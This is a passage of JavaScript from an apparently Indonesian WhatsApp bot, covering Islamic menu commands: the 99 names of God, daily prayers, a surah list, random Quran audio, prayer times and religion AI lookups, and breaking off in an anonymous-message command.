              translation_id: "Yang Memiliki Mutlak sifat Suci",
              translation_en: "The Most Holy",
            },
            {
              index: 5,
              latin: "As Salaam",
              arabic: "السَّلاَمُ",
              translation_id:
                "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
              translation_en: "Peace and Blessing",
            },
            {
              index: 6,
              latin: "Al Mu’min",
              arabic: "الْمُؤْمِنُ",
              translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
              translation_en: "The Guarantor",
            },
            {
              index: 7,
              latin: "Al Muhaimin",
              arabic: "الْمُهَيْمِنُ",
              translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
              translation_en: "The Guardian, the Preserver",
            },
            {
              index: 8,
              latin: "Al ‘Aziiz",
              arabic: "الْعَزِيزُ",
              translation_id: "Yang Memiliki Mutlak Kegagahan",
              translation_en: "The Almighty, the Self Sufficient",
            },
            {
              index: 9,
              latin: "Al Jabbar",
              arabic: "الْجَبَّارُ",
              translation_id: "Yang Memiliki Mutlak sifat Perkasa",
              translation_en: "The Powerful, the Irresistible",
            },
            {
              index: 10,
              latin: "Al Mutakabbir",
              arabic: "الْمُتَكَبِّرُ",
              translation_id:
                "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
              translation_en: "The Tremendous",
            },
            {
              index: 11,
              latin: "Al Khaliq",
              arabic: "الْخَالِقُ",
              translation_id: "Yang Memiliki Mutlak sifat Pencipta",
              translation_en: "The Creator",
            },
            {
              index: 12,
              latin: "Al Baari’",
              arabic: "الْبَارِئُ",
              translation_id:
                "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
              translation_en: "The Maker",
            },
            {
              index: 13,
              latin: "Al Mushawwir",
              arabic: "الْمُصَوِّرُ",
              translation_id:
                "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
              translation_en: "The Fashioner of Forms",
            },
            {
              index: 14,
              latin: "Al Ghaffaar",
              arabic: "الْغَفَّارُ",
              translation_id: "Yang Memiliki Mutlak sifat Pengampun",
              translation_en: "The Ever Forgiving",
            },
            {
              index: 15,
              latin: "Al Qahhaar",
              arabic: "الْقَهَّارُ",
              translation_id: "Yang Memiliki Mutlak sifat Memaksa",
              translation_en: "The All Compelling Subduer",
            },
            {
              index: 16,
              latin: "Al Wahhaab",
              arabic: "الْوَهَّابُ",
              translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
              translation_en: "The Bestower",
            },
            {
              index: 17,
              latin: "Ar Razzaaq",
              arabic: "الرَّزَّاقُ",
              translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
              translation_en: "The Ever Providing",
            },
            {
              index: 18,
              latin: "Al Fattaah",
              arabic: "الْفَتَّاحُ",
              translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
              translation_en: "The Opener, the Victory Giver",
            },
            {
              index: 19,
              latin: "Al ‘Aliim",
              arabic: "اَلْعَلِيْمُ",
              translation_id:
                "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
              translation_en: "The All Knowing, the Omniscient",
            },
            {
              index: 20,
              latin: "Al Qaabidh",
              arabic: "الْقَابِضُ",
              translation_id:
                "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
              translation_en: "The Restrainer, the Straightener",
            },
            {
              index: 21,
              latin: "Al Baasith",
              arabic: "الْبَاسِطُ",
              translation_id:
                "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
              translation_en: "The Expander, the Munificent",
            },
            {
              index: 22,
              latin: "Al Khaafidh",
              arabic: "الْخَافِضُ",
              translation_id:
                "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
              translation_en: "The Abaser",
            },
            {
              index: 23,
              latin: "Ar Raafi’",
              arabic: "الرَّافِعُ",
              translation_id:
                "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
              translation_en: "The Exalter",
            },
            {
              index: 24,
              latin: "Al Mu’izz",
              arabic: "الْمُعِزُّ",
              translation_id:
                "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
              translation_en: "The Giver of Honor",
            },
            {
              index: 25,
              latin: "Al Mudzil",
              arabic: "المُذِلُّ",
              translation_id:
                "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
              translation_en: "The Giver of Dishonor",
            },
            {
              index: 26,
              latin: "Al Samii’",
              arabic: "السَّمِيعُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
              translation_en: "The All Hearing",
            },
            {
              index: 27,
              latin: "Al Bashiir",
              arabic: "الْبَصِيرُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
              translation_en: "The All Seeing",
            },
            {
              index: 28,
              latin: "Al Hakam",
              arabic: "الْحَكَمُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
              translation_en: "The Judge, the Arbitrator",
            },
            {
              index: 29,
              latin: "Al ‘Adl",
              arabic: "الْعَدْلُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
              translation_en: "The Utterly Just",
            },
            {
              index: 30,
              latin: "Al Lathiif",
              arabic: "اللَّطِيفُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
              translation_en: "The Subtly Kind",
            },
            {
              index: 31,
              latin: "Al Khabiir",
              arabic: "الْخَبِيرُ",
              translation_id:
                "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
              translation_en: "The All Aware",
            },
            {
              index: 32,
              latin: "Al Haliim",
              arabic: "الْحَلِيمُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
              translation_en: "The Forbearing, the Indulgent",
            },
            {
              index: 33,
              latin: "Al ‘Azhiim",
              arabic: "الْعَظِيمُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
              translation_en: "The Magnificent, the Infinite",
            },
            {
              index: 34,
              latin: "Al Ghafuur",
              arabic: "الْغَفُورُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
              translation_en: "The All Forgiving",
            },
            {
              index: 35,
              latin: "As Syakuur",
              arabic: "الشَّكُورُ",
              translation_id:
                "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
              translation_en: "The Grateful",
            },
            {
              index: 36,
              latin: "Al ‘Aliy",
              arabic: "الْعَلِيُّ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
              translation_en: "The Sublimely Exalted",
            },
            {
              index: 37,
              latin: "Al Kabiir",
              arabic: "الْكَبِيرُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
              translation_en: "The Great",
            },
            {
              index: 38,
              latin: "Al Hafizh",
              arabic: "الْحَفِيظُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
              translation_en: "The Preserver",
            },
            {
              index: 39,
              latin: "Al Muqiit",
              arabic: "المُقيِت",
              translation_id:
                "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
              translation_en: "The Nourisher",
            },
            {
              index: 40,
              latin: "Al Hasiib",
              arabic: "الْحسِيبُ",
              translation_id:
                "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
              translation_en: "The Reckoner",
            },
            {
              index: 41,
              latin: "Al Jaliil",
              arabic: "الْجَلِيلُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
              translation_en: "The Majestic",
            },
            {
              index: 42,
              latin: "Al Kariim",
              arabic: "الْكَرِيمُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
              translation_en: "The Bountiful, the Generous",
            },
            {
              index: 43,
              latin: "Ar Raqiib",
              arabic: "الرَّقِيبُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
              translation_en: "The Watchful",
            },
            {
              index: 44,
              latin: "Al Mujiib",
              arabic: "الْمُجِيبُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
              translation_en: "The Responsive, the Answerer",
            },
            {
              index: 45,
              latin: "Al Waasi’",
              arabic: "الْوَاسِعُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
              translation_en: "The Vast, the All Encompassing",
            },
            {
              index: 46,
              latin: "Al Hakiim",
              arabic: "الْحَكِيمُ",
              translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
              translation_en: "The Wise",
            },
            {
              index: 47,
              latin: "Al Waduud",
              arabic: "الْوَدُودُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
              translation_en: "The Loving, the Kind One",
            },
            {
              index: 48,
              latin: "Al Majiid",
              arabic: "الْمَجِيدُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
              translation_en: "The All Glorious",
            },
            {
              index: 49,
              latin: "Al Baa’its",
              arabic: "الْبَاعِثُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
              translation_en: "The Raiser of the Dead",
            },
            {
              index: 50,
              latin: "As Syahiid",
              arabic: "الشَّهِيدُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
              translation_en: "The Witness",
            },
            {
              index: 51,
              latin: "Al Haqq",
              arabic: "الْحَقُّ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
              translation_en: "The Truth, the Real",
            },
            {
              index: 52,
              latin: "Al Wakiil",
              arabic: "الْوَكِيلُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
              translation_en: "The Trustee, the Dependable",
            },
            {
              index: 53,
              latin: "Al Qawiyyu",
              arabic: "الْقَوِيُّ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
              translation_en: "The Strong",
            },
            {
              index: 54,
              latin: "Al Matiin",
              arabic: "الْمَتِينُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
              translation_en: "The Firm, the Steadfast",
            },
            {
              index: 55,
              latin: "Al Waliyy",
              arabic: "الْوَلِيُّ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
              translation_en: "The Protecting Friend, Patron, and Helper",
            },
            {
              index: 56,
              latin: "Al Hamiid",
              arabic: "الْحَمِيدُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
              translation_en: "The All Praiseworthy",
            },
            {
              index: 57,
              latin: "Al Mushii",
              arabic: "الْمُحْصِي",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
              translation_en: "The Accounter, the Numberer of All",
            },
            {
              index: 58,
              latin: "Al Mubdi’",
              arabic: "الْمُبْدِئُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
              translation_en: "The Producer, Originator, and Initiator of all",
            },
            {
              index: 59,
              latin: "Al Mu’iid",
              arabic: "الْمُعِيدُ",
              translation_id:
                "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
              translation_en: "The Reinstater Who Brings Back All",
            },
            {
              index: 60,
              latin: "Al Muhyii",
              arabic: "الْمُحْيِي",
              translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
              translation_en: "The Giver of Life",
            },
            {
              index: 61,
              latin: "Al Mumiitu",
              arabic: "اَلْمُمِيتُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
              translation_en: "The Bringer of Death, the Destroyer",
            },
            {
              index: 62,
              latin: "Al Hayyu",
              arabic: "الْحَيُّ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
              translation_en: "The Ever Living",
            },
            {
              index: 63,
              latin: "Al Qayyuum",
              arabic: "الْقَيُّومُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
              translation_en: "The Self Subsisting Sustainer of All",
            },
            {
              index: 64,
              latin: "Al Waajid",
              arabic: "الْوَاجِدُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
              translation_en: "The Perceiver, the Finder, the Unfailing",
            },
            {
              index: 65,
              latin: "Al Maajid",
              arabic: "الْمَاجِدُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
              translation_en: "The Illustrious, the Magnificent",
            },
            {
              index: 66,
              latin: "Al Wahiid",
              arabic: "الْواحِدُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
              translation_en: "The One, The Unique, Manifestation of Unity",
            },
            {
              index: 67,
              latin: "Al ‘Ahad",
              arabic: "اَلاَحَدُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
              translation_en: "The One, the All Inclusive, the Indivisible",
            },
            {
              index: 68,
              latin: "As Shamad",
              arabic: "الصَّمَدُ",
              translation_id:
                "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
              translation_en:
                "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting",
            },
            {
              index: 69,
              latin: "Al Qaadir",
              arabic: "الْقَادِرُ",
              translation_id:
                "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
              translation_en: "The All Able",
            },
            {
              index: 70,
              latin: "Al Muqtadir",
              arabic: "الْمُقْتَدِرُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
              translation_en: "The All Determiner, the Dominant",
            },
            {
              index: 71,
              latin: "Al Muqaddim",
              arabic: "الْمُقَدِّمُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
              translation_en: "The Expediter, He who brings forward",
            },
            {
              index: 72,
              latin: "Al Mu’akkhir",
              arabic: "الْمُؤَخِّرُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
              translation_en: "The Delayer, He who puts far away",
            },
            {
              index: 73,
              latin: "Al Awwal",
              arabic: "الأوَّلُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
              translation_en: "The First",
            },
            {
              index: 74,
              latin: "Al Aakhir",
              arabic: "الآخِرُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
              translation_en: "The Last",
            },
            {
              index: 75,
              latin: "Az Zhaahir",
              arabic: "الظَّاهِرُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
              translation_en: "The Manifest; the All Victorious",
            },
            {
              index: 76,
              latin: "Al Baathin",
              arabic: "الْبَاطِنُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
              translation_en: "The Hidden; the All Encompassing",
            },
            {
              index: 77,
              latin: "Al Waali",
              arabic: "الْوَالِي",
              translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
              translation_en: "The Patron",
            },
            {
              index: 78,
              latin: "Al Muta’aalii",
              arabic: "الْمُتَعَالِي",
              translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
              translation_en: "The Self Exalted",
            },
            {
              index: 79,
              latin: "Al Barri",
              arabic: "الْبَرُّ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
              translation_en: "The Most Kind and Righteous",
            },
            {
              index: 80,
              latin: "At Tawwaab",
              arabic: "التَّوَابُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
              translation_en: "The Ever Returning, Ever Relenting",
            },
            {
              index: 81,
              latin: "Al Muntaqim",
              arabic: "الْمُنْتَقِمُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
              translation_en: "The Avenger",
            },
            {
              index: 82,
              latin: "Al Afuww",
              arabic: "العَفُوُّ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
              translation_en: "The Pardoner, the Effacer of Sins",
            },
            {
              index: 83,
              latin: "Ar Ra`uuf",
              arabic: "الرَّؤُوفُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
              translation_en: "The Compassionate, the All Pitying",
            },
            {
              index: 84,
              latin: "Malikul Mulk",
              arabic: "مَالِكُ الْمُلْكِ",
              translation_id:
                "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
              translation_en: "The Owner of All Sovereignty",
            },
            {
              index: 85,
              latin: "Dzul JalaaliWal Ikraam",
              arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
              translation_id:
                "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
              translation_en: "The Lord of Majesty and Generosity",
            },
            {
              index: 86,
              latin: "Al Muqsith",
              arabic: "الْمُقْسِطُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
              translation_en: "The Equitable, the Requiter",
            },
            {
              index: 87,
              latin: "Al Jamii’",
              arabic: "الْجَامِعُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
              translation_en: "The Gatherer, the Unifier",
            },
            {
              index: 88,
              latin: "Al Ghaniyy",
              arabic: "الْغَنِيُّ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
              translation_en: "The All Rich, the Independent",
            },
            {
              index: 89,
              latin: "Al Mughnii",
              arabic: "الْمُغْنِي",
              translation_id:
                "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
              translation_en: "The Enricher, the Emancipator",
            },
            {
              index: 90,
              latin: "Al Maani",
              arabic: "اَلْمَانِعُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
              translation_en: "The Withholder, the Shielder, the Defender",
            },
            {
              index: 91,
              latin: "Ad Dhaar",
              arabic: "الضَّارَّ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
              translation_en: "The Distressor, the Harmer",
            },
            {
              index: 92,
              latin: "An Nafii’",
              arabic: "النَّافِعُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
              translation_en: "The Propitious, the Benefactor",
            },
            {
              index: 93,
              latin: "An Nuur",
              arabic: "النُّورُ",
              translation_id:
                "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
              translation_en: "The Light",
            },
            {
              index: 94,
              latin: "Al Haadii",
              arabic: "الْهَادِي",
              translation_id:
                "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
              translation_en: "The Guide",
            },
            {
              index: 95,
              latin: "Al Baadii",
              arabic: "الْبَدِيعُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
              translation_en: "Incomparable, the Originator",
            },
            {
              index: 96,
              latin: "Al Baaqii",
              arabic: "اَلْبَاقِي",
              translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
              translation_en: "The Ever Enduring and Immutable",
            },
            {
              index: 97,
              latin: "Al Waarits",
              arabic: "الْوَارِثُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
              translation_en: "The Heir, the Inheritor of All",
            },
            {
              index: 98,
              latin: "Ar Rasyiid",
              arabic: "الرَّشِيدُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
              translation_en: "The Guide, Infallible Teacher, and Knower",
            },
            {
              index: 99,
              latin: "As Shabuur",
              arabic: "الصَّبُورُ",
              translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
              translation_en: "The Patient",
            },
          ];
          let json = JSON.parse(JSON.stringify(asmaulhusna));
          let data = json
            .map(
              (v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`
            )
            .join("\n\n");
          if (isNaN(args[0])) return reply(`contoh:\nasmaulhusna 1`);
          if (args[0]) {
            if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`;
            let { index, latin, arabic, translation_id, translation_en } =
              json.find((v) => v.index == args[0].replace(/[^0-9]/g, ""));
            return reply(
              `No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim()
            );
          }
          reply(`${contoh} + ${data} + ${anjuran}`);
        }
        break;
      case "doaharian":
        {
          let src = JSON.parse(
            fs.readFileSync("./database/doaharian.json", "utf-8")
          );
          let caption = src
            .map((v, i) => {
              return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim();
            })
            .join("\n\n");
          reply(`${caption}`);
        }
        break;
      case "listsurah":
      case "listsurat":
        {
          try {
            var surah = `_*List Surah*_

1. Al Fatihah (Pembuka)
2. Al Baqarah (Sapi Betina)
3. Ali Imran (Keluarga Imran)
4. An Nisa (Wanita)
5. Al Ma'idah (Jamuan)
6. Al An'am (Hewan Ternak)
7. Al-A'raf (Tempat yang Tertinggi)
8. Al-Anfal (Harta Rampasan Perang)
9. At-Taubah(Pengampunan)
10. Yunus (Nabi Yunus)
11. Hud (Nabi Hud)
12. Yusuf (Nabi Yusu)
13. Ar-Ra'd (Guruh)
14. Ibrahim (Nabi Ibrahim)
15. Al-Hijr (Gunung Al Hijr)
16. An-Nahl (Lebah)
17. Al-Isra' (Perjalanan Malam)
18. Al-Kahf (Penghuni-penghuni Gua)
19. Maryam (Maryam)
20. Ta Ha (Ta Ha)
21. Al-Anbiya (Nabi-Nabi)
22. Al-Hajj (Haji)
23. Al-Mu'minun (Orang-orang mukmin)
24. An-Nur (Cahaya)
25. Al-Furqan (Pembeda)
26. Asy-Syu'ara' (Penyair)
27. An-Naml (Semut)
28. Al-Qasas (Kisah-kisah)
29. Al-'Ankabut (Laba-laba)
30. Ar-Rum (Bangsa Romawi)
31. Luqman (Keluarga Luqman)
32. As-Sajdah (Sajdah)
33. Al-Ahzab (Golongan-golongan yang Bersekutu)
34. Saba' (Kaum Saba')
35. Fatir (Pencipta)
36. Ya Sin (Yaasiin)
37. As-Saffat (Barisan-barisan)
38. Sad (Shaad)
39. Az-Zumar (Rombongan-rombongan)
40. Ghafir (Yang Mengampuni)
41. Fussilat (Yang Dijelaskan)
42. Asy-Syura (Musyawarah)
43. Az-Zukhruf (Perhiasan)
44. Ad-Dukhan (Kabut)
45. Al-Jasiyah (Yang Bertekuk Lutut)
46. Al-Ahqaf (Bukit-bukit Pasir)
47. Muhammad (Nabi Muhammad)
48. Al-Fath (Kemenangan)
49. Al-Hujurat (Kamar-kamar)
50. Qaf (Qaaf)
51. Az-Zariyat (Angin yang Menerbangkan)
52. At-Tur (Bukit)
53. An-Najm (Bintang)
54. Al-Qamar (Bulan)
55. Ar-Rahman (Yang Maha Pemurah)
56. Al-Waqi'ah (Hari Kiamat)
57. Al-Hadid (Besi)
58. Al-Mujadilah (Wanita yang Mengajukan Gugatan)
59. Al-Hasyr (Pengusiran)
60. Al-Mumtahanah (Wanita yang Diuji)
61. As-Saff (Satu Barisan)
62. Al-Jumu'ah (Hari Jum'at)
63. Al-Munafiqun (Orang-orang yang Munafik)
64. At-Tagabun (Hari Dinampakkan Kesalahan-kesalahan)
65. At-Talaq (Talak)
67. Al-Mulk (Kerajaan)
68. Al-Qalam (Pena)
69. Al-Haqqah (Hari Kiamat)
70. Al-Ma'arij (Tempat Naik)
71. Nuh (Nabi Nuh)
72. Al-Jinn (Jin)
73. Al-Muzzammil (Orang yang Berselimut)
74. Al-Muddassir (Orang yang Berkemul)
75. Al-Qiyamah (Kiamat)
76. Al-Insan (Manusia)
77. Al-Mursalat (Malaikat-Malaikat Yang Diutus)
78. An-Naba' (Berita Besar)
79. An-Nazi'at (Malaikat-Malaikat Yang Mencabut)
80. 'Abasa (Ia Bermuka Masam)
81. At-Takwir (Menggulung)
82. Al-Infitar (Terbelah)
83. Al-Tatfif (Orang-orang yang Curang)
84. Al-Insyiqaq (Terbelah)
85. Al-Buruj (Gugusan Bintang)
86. At-Tariq (Yang Datang di Malam Hari)
87. Al-A'la (Yang Paling Tinggi)
88. Al-Gasyiyah (Hari Pembalasan)
89. Al-Fajr (Fajar)
90. Al-Balad (Negeri)
91. Asy-Syams (Matahari)
92. Al-Lail (Malam)
93. Ad-Duha (Waktu Matahari Sepenggalahan Naik (Dhuha))
94. Al-Insyirah (Melapangkan)
95. At-Tin (Buah Tin)
96. Al-'Alaq (Segumpal Darah)
97. Al-Qadr (Kemuliaan)
98. Al-Bayyinah (Pembuktian)
99. Az-Zalzalah (Kegoncangan)
100. Al-'Adiyat (Berlari Kencang)
101. Al-Qari'ah (Hari Kiamat)
102. At-Takasur (Bermegah-megahan)
103. Al-'Asr (Masa)
104. Al-Humazah (Pengumpat)
105. Al-Fil (Gajah)
106. Quraisy (Suku Quraisy)
107. Al-Ma'un (Barang-barang yang Berguna)
108. Al-Kausar (Nikmat yang Berlimpah)
109. Al-Kafirun (Orang-orang Kafir)
110. An-Nasr (Pertolongan)
111. Al-Lahab (Gejolak Api)
112. Al-Ikhlas (Ikhlas)
113. Al-Falaq (Waktu Subuh)
114. An-Nas (Umat Manusia)

`;
            m.reply(surah);
          } catch (error) {
            m.reply(`Maaf Terjadi Kesalahan`);
          }
        }
        break;
      case "randomquran":
        {
          try {
            let todi = await fetchJson(
              `https://raw.githubusercontent.com/pulsar/pulsar-islami/main/quranaudio.json`
            );
            const tod = await pickRandom(todi);
            const arti = tod.asma.translation.id;
            const audio = tod.audio;
            const asma = tod.asma.ar.short;
            const ayat = tod.ayatCount;
            const keterangan = tod.tafsir;
            const nama = tod.asma.id.short;
            const nomor = tod.number;
            const tempat = tod.type;
            var quran = `*乂 RANDOM QURAN*

*Nama* : ${nama}
*Asma* : ${asma}
*Surat Ke* : ${nomor}
*Arti* : ${arti}
*Total Ayat* : ${ayat}
*Type* : ${tempat}
*Keterangan* : ${keterangan}\n\n_Loading Audio..._`;
            await m.reply(quran);
            await Kilianhst.sendMessage(
              m.chat,
              { audio: { url: audio }, mimetype: "audio/mpeg" },
              { quoted: m }
            );
          } catch (error) {
            m.reply(`Maaf Terjadi Kesalahan`);
          }
        }
        break;
      case "jadwalsholat":
      case "sholat":
        {
          if (!text)
            return reply(
              `Masukkan Wilayah-nya\nContoh : ${prefix + command} Semarang`
            );
          try {
            const iddae = await findKodeDaerah(text);
            const res = await jadwalSholat(iddae.kode_daerah);
            reply(
              `*乂 JADWAL - SHOLAT*\n\n${Object.entries(res)
                .map(([name, data]) => `- *${name}* : ${data}`)
                .join("\n")
                .trim()}\n\n> ${footxt}`
            );
          } catch (error) {
            m.reply(`Masukan Daerah Yang Valid`);
          }
        }
        break;
      case "aireligion":
      case "aiagama":
        {
          try {
            const query = encodeURIComponent(text);
            const apis = [
              {
                name: "Islam",
                url: `https://api.mistra.top/api/ai/religion/islam-ai?text=${query}`,
              },
              {
                name: "Hindu",
                url: `https://api.mistra.top/api/ai/religion/hindu-ai?text=${query}`,
              },
              {
                name: "Kristen",
                url: `https://api.mistra.top/api/ai/religion/christian-ai?text=${query}`,
              },
              {
                name: "Buddha",
                url: `https://api.mistra.top/api/ai/religion/buddha-ai?text=${query}`,
              },
            ];
            let responses = await Promise.all(
              apis.map(async (api) => {
                try {
                  let res = await fetch(api.url);
                  let json = await res.json();
                  if (!json || !json.result)
                    throw new Error("Data tidak valid");
                  return `*${api.name}:*\n${json.result}`;
                } catch (err) {
                  return `*${api.name}:*\nGagal mengambil data.`;
                }
              })
            );
            let finalResponse = responses.join("\n\n");
            Kilianhst.sendMessage(
              m.chat,
              { text: finalResponse },
              { quoted: m }
            );
          } catch (err) {
            Kilianhst.sendMessage(
              m.chat,
              { text: "Terjadi kesalahan saat mengambil data." },
              { quoted: m }
            );
          }
        }
        break;
      case "jadwalsholat":
        {
          if (!isRegistered)
            return daftar(
              "*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur"
            );
          if (!text) return reply("Sebutkan Nama Kota Nya!");
          try {
            let resKota = await fetch(
              `https://api.myquran.com/v2/sholat/kota/semua`
            );
            let dataKota = await resKota.json();
            let cari = dataKota.data.find((k) =>
              k.lokasi.toLowerCase().includes(text.toLowerCase())
            );
            if (!cari) return reply("Kota Tidak Ditemukan!");

            let now = new Date();
            let tahun = now.getFullYear();
            let bulan = String(now.getMonth() + 1).padStart(2, "0");
            let tanggal = String(now.getDate()).padStart(2, "0");

            let resJadwal = await fetch(
              `https://api.myquran.com/v2/sholat/jadwal/${cari.id}/${tahun}/${bulan}/${tanggal}`
            );
            let dataJadwal = await resJadwal.json();
            let jadwal = dataJadwal.data.jadwal;

            let teks = `*Jadwal Sholat Hari Ini*\nLokasi: *${dataJadwal.data.lokasi}*\nTanggal: *${jadwal.tanggal}*\n\n`;
            teks += `Imsak : ${jadwal.imsak}\nSubuh : ${jadwal.subuh}\nDzuhur: ${jadwal.dzuhur}\nAshar : ${jadwal.ashar}\nMaghrib: ${jadwal.maghrib}\nIsya  : ${jadwal.isya}`;

            reply(teks);
          } catch {
            reply("Gagal Mengambil Jadwal Sholat!");
          }
        }
        break;

      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗜𝗦𝗟𝗔𝗠𝗜 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      case "menfes":
        {
          if (!isRegistered)
            return daftar(
              "*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur"
            );
          if (!text.includes("|"))
            return reply(
              "Format Salah! Contoh: .menfes @tag|Nama Kamu|Isi Pesan"
            );

          let [tujuanTag, namaSamaran, isiPesan] = text.split("|");
          let tujuan = tujuanTag.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

          if (!tujuan || !namaSamaran || !isiPesan)
            return reply("Semua Kolom Wajib Diisi!");

          let pengirim = m.sender;

          let pesan = `*📩 Pesan Menfes*\nDari: *${namaSamaran}*\nUntuk: @${
